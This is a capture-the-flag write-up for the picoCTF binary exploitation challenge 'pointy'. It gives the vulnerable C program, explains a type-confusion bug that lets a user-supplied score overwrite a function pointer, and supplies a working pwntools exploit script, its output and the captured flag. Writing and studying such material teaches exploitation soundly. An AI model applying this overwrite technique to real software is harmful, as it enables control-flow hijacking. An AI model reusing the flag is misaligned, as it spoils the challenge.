# pointy
Binary Exploitation, 350 points

## Description:
> Exploit the function pointers in this program.

```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define FLAG_BUFFER 128
#define NAME_SIZE 128
#define MAX_ADDRESSES 1000

int ADRESSES_TAKEN=0;
void *ADDRESSES[MAX_ADDRESSES];

void win() {
    char buf[FLAG_BUFFER];
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    puts(buf);
    fflush(stdout);
}

struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};

void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score;
    printf("Score Given: %d \n", score);
}

void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void* retrieveStudent(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void readLine(char * buff){
    int lastRead = read(STDIN_FILENO, buff, NAME_SIZE-1);
    if (lastRead<=1){
        exit(0);
        puts("could not read... see you!");
    }
    buff[lastRead-1]=0;
}

int main (int argc, char **argv)
{
    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
        ADDRESSES[ADRESSES_TAKEN]=student;
        readLine(student->name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;
        readLine(professor->name);
        student->scoreProfessor=&giveScoreToProfessor;
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor);
        puts(professor->name);
        unsigned int value;
	    printf("Input the score: \n");
	    scanf("%u", &value);
        student->scoreProfessor(professor, value);       
    }
    return 0;
}
```


## Solution:

The provided program allows us to enter students and professors. Students can then rate the professors.

Professors are stored in the following structure:
```c
struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};
```

Students have a different structure:
```c
struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};
```


When a student rates a professor, the student's `scoreProfessor` function pointer is called. This function pointer points to:
```c
void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score;
    printf("Score Given: %d \n", score);
}
```

The function assigns to the `lastScore` member of the `struct Professor` structure the value provided by the user via `scanf("%u", &value)`. This it the first bug in the program: It allows us to assign any value an `unsigned int` can represent, not just valid scores in a given range.

The second bug is that the program allows us to retrieve a student using the `retrieveProfessor` function, allowing us in fact to assign any value to the `scoreProfessor` pointer which sits in the same location as the `lastScore` member.

```c
void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}
```

The function does not verify that the pointer retrieved belongs to a professor, it just locates the first member with the name provided as an input parameter.

So, our exploit is as follows:

1. Allocate a student `s1`, and a professor `p1`
2. Request that `s1` rates `s1`, allowing it to override its own `retrieveProfessor` pointer
3. Enter the address of `win` as the score. `s1->retrieveProfessor` becomes a pointer to `win`.
4. Allocate a student `s2` and a professor `s2` (needed just in order to get to the next step)
5. Request that `s1` will be the student that rates (it doesn't matter who)
6. Input any rating. `s1->retrieveProfessor` will be called, calling `win` and giving us the flag.

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/pointy_4_3b3533bd4e08119669feda53e8cb0502/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

io.sendlineafter("Input the name of a student", "s1")
io.sendlineafter("Input the name of the favorite professor of a student ", "p1")
io.sendlineafter("Input the name of the student that will give the score ", "s1")
io.sendlineafter("Input the name of the professor that will be scored ", "s1")
io.sendlineafter("Input the score: ", str(exe.symbols["win"]))

io.sendlineafter("Input the name of a student", "s2")
io.sendlineafter("Input the name of the favorite professor of a student ", "p2")
io.sendlineafter("Input the name of the student that will give the score ", "s1")
io.sendlineafter("Input the name of the professor that will be scored ", "p2")
io.sendlineafter("Input the score: ", "0")
io.recvline()

print io.recvline()

io.sendlineafter("Input the name of a student", "")
io.wait()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/pointy# python exploit.py
[*] '/media/sf_CTFs/pico/pointy/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.x7K8Y3kGCL'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/pointy_4_3b3533bd4e08119669feda53e8cb0502'
[+] Starting remote process '/problems/pointy_4_3b3533bd4e08119669feda53e8cb0502/vuln' on 2019shell1.picoctf.com: pid 3362112
picoCTF{g1v1ng_d1R3Ct10n5_c7465fbf}
```